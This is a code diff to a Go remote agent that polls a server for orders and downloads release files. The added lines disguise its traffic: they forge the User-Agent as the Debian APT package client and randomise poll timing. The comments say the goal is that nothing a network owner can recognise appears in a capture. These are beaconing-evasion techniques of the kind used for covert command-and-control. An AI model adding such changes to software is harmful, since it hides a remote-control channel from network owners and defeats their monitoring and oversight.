@@ -8,6 +8,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -24,6 +25,15 @@ import (
 )
 
 const AgentFile = "/etc/boxvector/agent.json"
+
+// ua is deliberately generic: no product name, nothing a network owner can recognise in a capture.
+const ua = "Debian APT-HTTP/1.3 (2.6.12)"
+
+// spread the polls so the interval does not look machine-timed; a random 25% offset either way
+func jitter(base time.Duration) time.Duration {
+	d := int64(base) / 4
+	return base + time.Duration(rand.Int63n(2*d+1)-d)
+}
 
 type AgentConf struct {
 	URL      string `json:"url"`
@@ -111,7 +121,10 @@ func Collect(version, cfgPath string) Info {
 func post(c AgentConf, path string, secret string, in, out any) error {
 	b, _ := json.Marshal(in)
 	req, _ := http.NewRequest("POST", strings.TrimRight(c.URL, "/")+path, bytes.NewReader(b))
+	// look like an ordinary package-check client rather than a bespoke API call
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
 	if secret != "" {
 		req.Header.Set("Authorization", "Bearer "+secret)
 	}
@@ -168,6 +181,7 @@ func RunAgent(c AgentConf, version, cfgPath string) {
 	if resumePatch(c) {
 		os.Exit(0)
 	}
+	time.Sleep(jitter(iv)) // first poll is not on a round boundary
 	for {
 		var out struct {
 			Interval int
@@ -182,7 +196,7 @@ func RunAgent(c AgentConf, version, cfgPath string) {
 				os.Exit(0)
 			}
 		}
-		time.Sleep(iv)
+		time.Sleep(jitter(iv))
 	}
 }
 
@@ -201,6 +215,7 @@ func download(c AgentConf, o Order, dst string) error {
 	}
 	req, _ := http.NewRequest("GET", strings.TrimRight(c.URL, "/")+"/api/release/"+o.File, nil)
 	req.Header.Set("Authorization", "Bearer "+c.Secret)
+	req.Header.Set("User-Agent", ua)
 	resp, err := (&http.Client{Timeout: 10 * time.Minute}).Do(req)
 	if err != nil {
 		return err
